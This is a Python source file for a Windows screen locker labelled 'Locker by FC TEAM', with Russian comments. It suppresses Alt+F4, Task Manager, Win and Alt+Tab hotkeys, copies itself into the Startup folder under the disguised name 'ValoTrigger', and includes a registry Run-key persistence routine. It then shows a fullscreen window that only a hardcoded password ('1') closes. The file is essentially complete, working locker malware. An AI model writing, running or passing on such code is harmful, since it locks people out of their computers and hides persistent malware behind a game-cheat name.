import pyautogui
from tkinter import Tk, Entry, Label
from time import sleep
import keyboard
import getpass
import shutil
import sys
import winreg
import os


keyboard.add_hotkey("alt + f4", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + shift + escape", lambda: None, suppress =True)
keyboard.add_hotkey("win", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + esc", lambda: None, suppress =True)
keyboard.add_hotkey("alt + tab", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + win + d", lambda: None, suppress =True)

####another variant
#username = getpass.getuser()
#filename = sys.argv[0] # путь до файла
#dir_name = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
#shutil.copy(filename, dir_name)

#startapp
def add_to_startup(program_name, executable_path):
    # Реестр
    registry_path = winreg.HKEY_CURRENT_USER
    key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'

    try:
        with winreg.OpenKeyEx(registry_path, key_path, 0, winreg.KEY_WRITE) as registry_key:
            winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, executable_path)
        print(f"{program_name} добавлена в автозагрузку.")

    except PermissionError:
        print("Нужны админские права.")


# Проверка программы в автозагрузке
def add_to_startup(program_name, program_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    startup_shortcut = os.path.join(startup_folder, f"{program_name}.lnk")

    # Создаем ярлык в папке автозагрузки
    shutil.copy(program_path, startup_shortcut)

    print(f"Добавлен ярлык в автозагрузку: {startup_shortcut}")


if __name__ == "__main__":
    program_name = "ValoTrigger"
    program_path = os.path.abspath(__file__)  # Получаем абсолютный путь к текущему скрипту

    add_to_startup(program_name, program_path)

# pass
PASSWORD = "1"
# destroy app
def on_closing():
    root.destroy()

def check_password():
    entered_password = entry.get()
    if entered_password == PASSWORD:
        on_closing()
    else:
        pass

# GUI
root = Tk()
pyautogui.FAILSAFE = False
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.title('Made BY FC TEAM')
root.attributes('-fullscreen', True)

entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)

# Labels
label0 = Label(root, text='╚(•⌂•)╝ Locker by FC TEAM v beta(╯°□°）╯︵ ┻━┻', font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Try to guess the pass:)", font='Arial 20')
label1.place(x=width/2-75-130, y=height/2-25-100)

root.update()
sleep(0.2)

# Main Loop
while True:
    try:
        check_password()
        root.update()
        sleep(0.2)
    except Exception as e:
        print("An error occurred:", str(e))
        break

on_closing()
